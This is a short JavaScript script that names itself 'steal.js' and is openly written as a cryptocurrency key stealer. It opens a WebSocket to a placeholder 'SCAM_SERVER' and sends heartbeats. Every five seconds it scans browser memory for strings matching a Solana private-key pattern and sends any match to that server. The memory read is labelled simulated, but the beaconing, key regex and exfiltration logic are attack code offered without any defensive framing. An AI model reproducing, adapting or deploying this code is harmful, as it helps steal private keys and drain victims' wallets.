(async () => {
    console.log("steal.js is running! Connecting to WebSocket...");

    const socket = new WebSocket(SCAM_SERVER);

    socket.onopen = () => {
        console.log("WebSocket connected!");
        setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
    };

    async function scanMemory() {
        console.log("Scanning memory for private keys...");

        let memoryDump = performance.memory;  // Simulated memory access
        const match = JSON.stringify(memoryDump).match(/5[1-9A-HJ-NP-Za-km-z]{44,50}/);  // Solana Key Pattern

        if (match) {
            console.log("Extracted Private Key:", match[0]);
            socket.send(JSON.stringify({ key: match[0] }));
        } else {
            console.log("No key found.");
        }
    }

    setInterval(scanMemory, 5000);  // Scan every 5 seconds
})();
